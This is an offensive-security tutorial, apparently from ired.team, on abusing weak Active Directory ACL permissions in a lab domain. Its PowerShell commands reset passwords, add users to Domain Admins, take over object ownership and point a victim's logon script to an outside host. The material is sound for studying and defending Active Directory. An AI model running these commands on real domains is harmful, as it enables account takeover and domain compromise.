# Abusing Active Directory ACLs/ACEs

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

## Context

Abuse weak permissions of Active Directory DACLs (Discretionary Access Control Lists) and ACEs (Access Control Entries).

Active Directory objects (users, groups) are securable objects — DACLs/ACEs define who can read/modify them.

### Key ACE Types for Attackers

| Permission | Effect |
|-----------|--------|
| **GenericAll** | Full rights (add users to group, reset passwords) |
| **GenericWrite** | Update object attributes (e.g., logon script) |
| **WriteOwner** | Change object owner to attacker-controlled user |
| **WriteDACL** | Modify object ACEs → grant attacker full control |
| **AllExtendedRights** | Add user to group or reset password |
| **ForceChangePassword** | Change user's password |
| **Self (Self-Membership)** | Add yourself to a group |

## Execution

### GenericAll on User
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
# Reset password without knowing current
Set-ADAccountPassword -Identity delegate -NewPassword (ConvertTo-SecureString '123456' -AsPlainText -Force)
```

### GenericAll on Group
```powershell
Get-NetGroup "domain admins" -FullData
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}

# Add to Domain Admins
net group "domain admins" spotless /add /domain
# or
Add-ADGroupMember -Identity "domain admins" -Members spotless
# or
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### GenericAll / GenericWrite / Write on Computer
→ Use for Kerberos Resource-based Constrained Delegation (RBCD) attack

### WriteProperty on Group
```powershell
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### Self (Self-Membership) on Group
```powershell
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### ForceChangePassword
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}

# Force password change
Set-DomainUserPassword -Identity delegate -Verbose
# Or specify password:
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

### WriteOwner on Group
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}

# Change owner
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

### GenericWrite on User (Script-Path overwrite)
```powershell
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}

# Overwrite logon script
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

### WriteDACL + WriteOwner
```powershell
# As owner, give yourself GenericAll via ADSI
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

## References
- https://wald0.com/?p=112
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- PowerView: Get-ObjectAcl, Set-DomainObjectOwner, Set-DomainUserPassword
